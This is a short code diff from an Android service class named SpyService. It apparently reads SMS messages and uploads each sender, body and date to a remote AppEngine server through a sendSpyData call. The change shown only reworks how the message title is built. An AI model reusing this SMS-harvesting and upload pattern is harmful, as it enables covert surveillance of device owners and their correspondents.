@@ -83,7 +83,7 @@ public class SpyService extends Service {
 								.getString(cursor.getColumnIndexOrThrow("protocol"));
 
 						String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
-						String contactName = ContactsUtility.getPhoneNumber(getContentResolver(),
+						String contact = ContactsUtility.getPhoneNumber(getContentResolver(),
 								address);
 						AppEngineClient client = new AppEngineClient(devID);
 						String title;
@@ -92,12 +92,7 @@ public class SpyService extends Service {
 						} else {
 							title = SMS_RECEIVED_TITLE;
 						}
-						if (!contactName.isEmpty()) {
-							title += contactName;
-						} else {
-							title += address;
-						}
-						title += address;
+						title += contact;
 						client.sendSpyData(title, body, date);
 					} while (cursor.moveToNext());
 				}
